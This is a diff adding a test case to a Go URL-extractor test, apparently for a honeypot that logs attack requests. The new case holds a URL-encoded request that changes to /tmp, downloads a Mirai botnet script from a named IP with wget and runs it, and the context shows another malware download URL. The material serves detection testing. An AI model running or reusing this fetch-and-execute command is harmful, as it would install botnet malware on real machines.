@@ -190,6 +190,18 @@ func TestURLExtractor(t *testing.T) {
 			},
 		},
 		{
+			description: "Find URL in query param name",
+			urlsToFind:  []string{"http://64.83.132.82/malware/mirai.sh"},
+			request: database.Request{
+
+				Uri:        "/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F64.83.132.82%2Fmalware%2Fmirai.sh%3B%20sh%20mirai.sh",
+				Raw:        "ssadsads",
+				Body:       []byte(""),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
+
+		{
 			description: "Find URL in query string (not encoded)",
 			urlsToFind:  []string{"http://45.86.155.249/bestone/.nekoisdaddy.mips"},
 			request: database.Request{
